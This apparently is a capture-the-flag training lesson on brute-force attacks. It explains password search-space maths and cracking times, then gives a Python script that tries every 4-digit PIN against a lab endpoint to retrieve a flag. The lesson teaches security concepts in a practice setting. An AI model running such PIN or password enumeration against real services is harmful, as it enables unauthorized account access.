# Brute Force Attacks

To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:

```text
Possible Combinations = Character Set Size ^ Password Length
```

For example, a 6-character password using only lowercase letters (character set size of 26) has:

```text
26^6 = 308,915,776
```

possible combinations.

In contrast, an 8-character password with the same character set has:

```text
26^8 = 208,827,064,576
```

possible combinations.

Adding uppercase letters, numbers, and symbols to the character set further expands the search space exponentially.

This exponential growth in the number of combinations highlights the importance of password length and complexity. Even a small increase in length or the inclusion of additional character types can dramatically increase the time and resources required for a successful brute-force attack.

---

# Password Complexity Examples

| Scenario | Password Length | Character Set | Possible Combinations |
|----------|----------------|---------------|----------------------|
| Short and Simple | 6 | Lowercase letters (a-z) | `26^6 = 308,915,776` |
| Longer but Still Simple | 8 | Lowercase letters (a-z) | `26^8 = 208,827,064,576` |
| Adding Complexity | 8 | Lowercase and uppercase letters (a-z, A-Z) | `52^8 = 53,459,728,531,456` |
| Maximum Complexity | 12 | Lowercase and uppercase letters, numbers, and symbols | `94^12 = 475,920,493,781,698,549,504` |

As you can see, even a slight increase in password length or the inclusion of additional character types dramatically expands the search space. This significantly increases the number of possible combinations that an attacker must try, making brute-forcing increasingly challenging and time-consuming.

However, the time it takes to crack a password isn't just dependent on the size of the search space—it also hinges on the attacker's available computational power.

The more powerful the attacker's hardware (e.g., GPUs, CPUs, or cloud-based computing resources), the more password guesses they can make per second.

While a complex password can take years to brute-force with a single machine, a sophisticated attacker using distributed high-performance computing resources could reduce that time drastically.

---

# Password Cracking Time Comparison

The chart comparing password cracking times for basic and super computers illustrates an exponential relationship between password complexity and cracking time.

As:
- Password length increases
- Character sets expand

the total number of possible combinations grows exponentially.

This dramatically increases the time required to crack passwords, even with powerful hardware.

---

# Comparing Basic Computer vs Supercomputer

## Basic Computer

```text
1 million passwords/second
```

A basic computer is adequate for cracking simple passwords quickly but becomes impractically slow for complex passwords.

For example:

```text
Cracking an 8-character password using letters and digits may take approximately 6.92 years.
```

---

## Supercomputer

```text
1 trillion passwords/second
```

A supercomputer drastically reduces cracking times for simpler passwords.

However, even with immense computational power, highly complex passwords may still take an impractical amount of time to crack.

For example:

```text
A 12-character password using all ASCII characters could still take approximately 15,000 years to crack.
```

---

# Cracking the PIN

To follow along, start the target system from the question section.

The target application:
- Generates a random 4-digit PIN
- Exposes an endpoint:

```text
/pin
```

The endpoint accepts a PIN as a query parameter.

If the correct PIN is supplied:
- The application responds with success
- The flag is returned

Otherwise:
- An error message is displayed

---

# Python Brute Force Script

Save the following script as:

```text
pin-solver.py
```

Modify:
- IP address
- Port number

to match the target system.

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):

    formatted_pin = f"{pin:04d}"  # Convert number to 4-digit format

    print(f"Attempted PIN: {formatted_pin}")

    # Send request to the server
    response = requests.get(
        f"http://{ip}:{port}/pin?pin={formatted_pin}"
    )

    # Check if flag exists in response
    if response.ok and 'flag' in response.json():

        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")

        break
```

---

# How the Script Works

The script systematically iterates through all possible 4-digit PINs:

```text
0000 → 9999
```

For every PIN:
1. It formats the value into 4 digits
2. Sends a GET request to the `/pin` endpoint
3. Checks the response
4. Stops when the correct PIN is discovered

The script uses:

```python
requests.get()
```

to communicate with the web application.

The following line checks whether:
- The request succeeded
- The flag exists in the response

```python
if response.ok and 'flag' in response.json():
```

Once the correct PIN is identified, the script prints:
- Correct PIN
- Captured flag

and exits.

---

# Running the Script

```bash
python pin-solver.py
```

---

# Example Output

```text
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052

Correct PIN found: 4053
Flag: HTB{...}
```

The output demonstrates the progression of the brute-force attack by displaying every attempted PIN.

Once the correct PIN is discovered:
- The application returns the flag
- The script terminates successfully

This demonstrates a successful brute-force attack against a weak 4-digit PIN authentication mechanism.
